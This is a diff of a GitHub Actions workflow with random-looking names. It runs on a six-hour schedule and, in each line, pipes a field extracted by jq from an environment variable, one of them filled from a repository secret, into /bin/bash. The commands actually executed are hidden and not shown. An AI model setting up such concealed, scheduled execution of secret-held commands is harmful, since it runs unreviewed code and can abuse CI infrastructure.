@@ -2,24 +2,23 @@ name: gantingxi3810
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 5/6 * * *'
+    - cron: '14 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: gantingxi3810
         env:
-          v86: ${{ secrets.v86 }}
+          gn2368: ${{ secrets.gn2368 }}
         run: |
-          echo $v86 | jq -r .u511 | /bin/bash
-          echo $atak06 | jq -r .uounr4612 | /bin/bash
-          echo $v0540 | jq -r .oxh483 | /bin/bash
-          echo $pqy07840 | jq -r .rouho2 | /bin/bash
-          echo $ljbb287 | jq -r .mgmh7295 | /bin/bash
-          echo $smnhg3 | jq -r .dnn026 | /bin/bash
-          echo $ca1 | jq -r .nyrg996 | /bin/bash
-          echo $junn0 | jq -r .ul762 | /bin/bash
-          echo $gpbr040 | jq -r .an8 | /bin/bash
+          echo $gn2368 | jq -r .pies81807 | /bin/bash
+          echo $wf69188 | jq -r .r26830 | /bin/bash
+          echo $qcry326 | jq -r .lfbg67 | /bin/bash
+          echo $lcpxj110 | jq -r .dz0821 | /bin/bash
+          echo $zuw6490 | jq -r .qh2452 | /bin/bash
+          echo $lcmf02353 | jq -r .facn774 | /bin/bash
+          echo $jfdpv765 | jq -r .dn1 | /bin/bash
+          echo $t87668 | jq -r .buxj845 | /bin/bash
 
